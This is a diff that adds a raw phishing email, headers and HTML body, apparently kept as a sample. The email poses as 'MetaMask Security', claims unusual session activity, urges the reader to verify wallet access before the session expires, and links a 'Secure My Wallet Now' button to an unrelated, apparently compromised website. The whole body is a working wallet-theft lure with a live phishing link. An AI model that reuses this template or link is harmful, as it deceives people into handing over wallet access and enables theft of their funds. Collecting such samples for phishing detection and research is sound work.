@@ -1,0 +1,80 @@
+Return-Path: <postmaster@460009fce6.nxcli.io>
+Delivered-To: info@vorteksenerji.com
+Received: from fr-life.guzelhosting.com
+	by fr-life.guzelhosting.com with LMTP
+	id 8rlVM58zCGjgGgAAOB6+FQ
+	(envelope-from <postmaster@460009fce6.nxcli.io>)
+	for <info@vorteksenerji.com>; Wed, 23 Apr 2025 03:26:07 +0300
+Return-path: <postmaster@460009fce6.nxcli.io>
+Envelope-to: info@vorteksenerji.com
+Delivery-date: Wed, 23 Apr 2025 03:26:07 +0300
+Received: from cloudhost-2060988.uk-south-2.nxcli.net ([165.84.218.167]:64496)
+	by fr-life.guzelhosting.com with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+	(Exim 4.98.1)
+	(envelope-from <postmaster@460009fce6.nxcli.io>)
+	id 1u7NwF-000000002vM-3NFg
+	for info@vorteksenerji.com;
+	Wed, 23 Apr 2025 03:26:07 +0300
+Comment: DomainKeys? See http://domainkeys.sourceforge.net/
+DomainKey-Signature: a=rsa-sha1; q=dns; c=nofws;
+  s=default; d=460009fce6.nxcli.io;
+  b=I08y3Gu42bSIBF4JQQbb/909GUXBw5JJukgw2AnHBsUn2e2HsYfFvWD5yym8P8bRcp0/ZXwRlTz9vuOZ3fRfKTgwBo0pTQyFQb0fKZrIxVHnavarL5cy2d0fQky2llMwm8sR2v4p1dlI8E3Unlv+mfxcnqggDeHY34nbwqFQtgoH64dLvzD2RMf5DUk51+bNsVw2ahjIX15KkZcI3YfwOgNlB0X788jK/6SmZo72X8ML8/HbYL6Fh+P56gqKOdXeRNFr4F3FJLLn/19rmhw6DY5WnxtOoYRTSfMFcihBXUUyC52WQc532XD524Fv5mbp5i6GLJnmZljpDSXP3rtW6w==;
+  h=Received:Date:Message-ID:To:Subject:X-PHP-Originating-Script:From:Reply-To:Content-Type:X-Mailer-ID:X-Origin-IP:X-Message-ID:X-Origin-Time:X-Campaign-ID:List-Unsubscribe;
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed; d=460009fce6.nxcli.io; h=
+	date:message-id:to:subject:from:reply-to:content-type
+	:list-unsubscribe; s=default; bh=WFaJdZ3FwDfUmcVcKdpQ1mkYXFeycbA
+	muBUJcaa+/e0=; b=tk81QsPPNNwqUweakTW856j0VvwmnA5mfSaTJaPyzGKFt/+
+	pXwujwV2fhZYUn9iECZZaIOY+wIYePttJVuDz7t9z3r9M8yHLt0+O+y80AGr2Qt0
+	KyA7zNk5NDLFEPEwJwv80j/7T/S4nU5Y/CjqS7R8yIJZBKcU7i8JYI23aLWpwYQS
+	MQ7FVKIK4mwmiLzt64sHHUFPVyPCPAsvuDlq7KlGUy/mcNc0cWK0nZKPVWIDNUrT
+	Jjpn/US4gajPctf/1rWyppcpdj5z5qpuBzUsn7GmxroeW7M8JQ796Tf0IyvcGb+F
+	r0CNt0yAFmeMbEnlrEZBwhJVwqDt8kItxUhKdGg==
+Received: (qmail 2311 invoked by uid 10165); 23 Apr 2025 01:25:25 +0100
+Date: 23 Apr 2025 01:25:25 +0100
+Message-ID: <20250423002525.2308.qmail@cloudhost-2060988.uk-south-2.nxcli.net>
+To: info@vorteksenerji.com
+Subject: =?UTF-8?B?U2VjdXJpdHkgQWxlcnQ6IFZlcmlmeSBZb3VyIE1ldGFNYXNrIEFjY291bnQ=?=
+X-PHP-Originating-Script: 10165:m.php
+From: MetaMask Security <e9bad59fcc91e520e30b445f80ded3a1@wallet-support.net>
+Reply-To: no-reply@example.com
+Content-Type: text/html; charset=UTF-8
+X-Mailer-ID: 6808337522c5c
+X-Origin-IP: 192.168.1.173
+X-Message-ID: c34c98cfd0284366b16abab25ac58c52
+X-Origin-Time: 2025-04-23 00:25:25
+X-Campaign-ID: 04f4dc2ba2fe0f5a
+List-Unsubscribe: <mailto:unsubscribe@example.com>
+
+
+
+<!DOCTYPE html>
+<html>
+<body style="margin:0;padding:20px;font-family:Arial,sans-serif;background-color:#fff;color:#333;">
+<table width="100%" cellpadding="0" cellspacing="0" style="max-width:600px;margin:auto;border:1px solid #ddd;border-radius:6px;">
+  <tr>
+    <td style="background-color:#fff;padding:20px;text-align:center;">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" width="60" alt="Access Logo" style="margin-bottom:20px;">
+      <h2 style="color:#f6851b;font-size:20px">Verify Your Wallet Access</h2>
+    </td>
+  </tr>
+  <tr>
+    <td style="padding:20px;">
+      <p>We detected an update to your session activity. To maintain uninterrupted access, please confirm your identity below.</p>
+      <p>Activating Two-Factor Authentication (2FA) helps secure your wallet against unauthorized access—even if your password is known.</p>
+      <p style="text-align:center;margin:30px 0">
+        <a href="https://www.verkeerbeheer.nl/images/n/?id=4118464037834318562-8400" style="background-color:#f6851b;color:#fff;text-decoration:none;padding:12px 22px;border-radius:5px;font-weight:bold">🔒 Secure My Wallet Now</a>
+      </p>
+      <p style="text-align:center;font-size:13px;color:#777;">For your protection, this session will expire shortly.</p>
+      <p>If this wasn't initiated by you, please disregard this message.</p>
+      <p>Regards,<br>Support Team</p>
+    </td>
+  </tr>
+  <tr>
+    <td style="background-color:#f2f2f2;text-align:center;font-size:12px;color:#888;padding:10px;border-top:1px solid #ddd;">
+      © 2025 Account Services. All rights reserved.
+    </td>
+  </tr>
+</table>
+</body>
+</html>
+<!-- Random-ID: 6808337522c6b -->
